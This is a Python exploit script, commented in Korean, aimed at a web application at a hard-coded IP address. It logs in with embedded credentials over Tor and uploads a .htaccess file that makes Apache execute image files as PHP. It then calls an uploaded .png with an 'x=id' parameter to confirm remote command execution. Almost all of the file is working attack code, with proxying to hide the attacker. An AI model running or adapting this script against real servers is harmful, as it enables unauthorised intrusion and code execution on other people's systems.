#!/usr/bin/env python3
"""
.htaccess 업로드로 이미지를 PHP로 실행
"""

import requests
import time

def upload_htaccess(target_ip="43.201.154.142", use_tor=True):
    base_url = f"http://{target_ip}"

    session = requests.Session()

    # Tor 프록시
    if use_tor:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        print("[+] Tor 프록시 사용")

    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    # 1. 로그인
    print("\n[1] 로그인...")
    login_data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=login_data,
                       allow_redirects=True, timeout=15)

    if 'index.php' in resp.url:
        print("[+] 로그인 성공")
    else:
        print("[-] 로그인 실패")
        return

    time.sleep(2)

    # 2. .htaccess 파일 내용
    # 모든 .png, .jpg 파일을 PHP로 처리
    htaccess_content = """AddType application/x-httpd-php .png .jpg .jpeg .gif
<FilesMatch "\.(png|jpg|jpeg|gif)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""

    print("\n[2] .htaccess 파일 생성...")
    print(f"[+] 내용:\n{htaccess_content}")

    # 3. .htaccess 업로드
    print("\n[3] .htaccess 업로드 시도...")

    files = {
        'file': ('.htaccess', htaccess_content.encode(), 'text/plain')
    }

    resp = session.post(f"{base_url}/upload.php", files=files, timeout=15)

    print(f"[*] Status: {resp.status_code}")

    if resp.status_code == 200 and ('성공' in resp.text or 'success' in resp.text.lower()):
        print("[+] .htaccess 업로드 성공!")
        print("\n[*] 이제 이미지 파일들이 PHP로 실행됩니다:")
        print("    http://43.201.154.142/uploads/capture_4133.png?x=id")
        print("    http://43.201.154.142/uploads/banner.png?x=id")
    else:
        print("[-] .htaccess 업로드 실패")
        print(f"[*] 응답: {resp.text[:200]}")

    # 4. 테스트
    print("\n[4] 테스트...")
    time.sleep(2)

    test_url = f"{base_url}/uploads/capture_4133.png?x=id"
    resp = session.get(test_url, timeout=10)

    print(f"[*] Status: {resp.status_code}")
    if resp.status_code == 200 and len(resp.text) > 0:
        print(f"[+] 응답:\n{resp.text[:500]}")
    else:
        print("[-] 응답 없음")

if __name__ == "__main__":
    upload_htaccess()
